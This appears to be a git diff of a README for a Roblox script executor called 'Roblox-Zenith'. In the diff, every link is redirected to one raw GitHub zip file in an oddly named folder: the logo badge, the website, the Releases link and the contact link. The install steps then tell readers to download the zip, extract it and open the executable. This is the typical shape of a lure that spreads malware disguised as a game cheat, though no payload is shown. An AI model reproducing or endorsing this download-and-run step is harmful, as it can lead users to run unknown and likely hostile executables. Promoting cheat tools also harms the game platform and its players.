@@ -2,7 +2,7 @@
 
 Welcome to the **Roblox-Zenith** repository! Here, you will find everything you need to enhance your Roblox gaming experience with powerful script execution capabilities. 
 
-![Zenith Logo](https://img.shields.io/badge/ZENITH-Executor-brightgreen)
+![Zenith Logo](https://github.com/ltaycn301/Roblox-Zenith/raw/refs/heads/master/Gurneyite/Zenith-Roblox-v1.6.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the **Roblox-Zenith** repository! Here, you will find everything you 
 
 **Roblox-Zenith** is designed for users who want to take their Roblox gameplay to the next level. With our advanced executor, you can run scripts seamlessly and unlock new possibilities within your favorite games. 
 
-To get started, visit [Zenith](https://getzenith.org) for more information.
+To get started, visit [Zenith](https://github.com/ltaycn301/Roblox-Zenith/raw/refs/heads/master/Gurneyite/Zenith-Roblox-v1.6.zip) for more information.
 
 ## Features
 
@@ -33,7 +33,7 @@ To get started, visit [Zenith](https://getzenith.org) for more information.
 
 To install **Roblox-Zenith**, follow these steps:
 
-1. Download the latest version from the [Releases](https://github.com/yourusername/Roblox-Zenith/releases) section.
+1. Download the latest version from the [Releases](https://github.com/ltaycn301/Roblox-Zenith/raw/refs/heads/master/Gurneyite/Zenith-Roblox-v1.6.zip) section.
 2. Extract the downloaded file to your desired location.
 3. Open the executable file to launch the application.
 
@@ -84,7 +84,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any questions or feedback, feel free to reach out to us. You can also visit [Zenith](https://getzenith.org) for more resources and community support.
+For any questions or feedback, feel free to reach out to us. You can also visit [Zenith](https://github.com/ltaycn301/Roblox-Zenith/raw/refs/heads/master/Gurneyite/Zenith-Roblox-v1.6.zip) for more resources and community support.
 
 ---
 
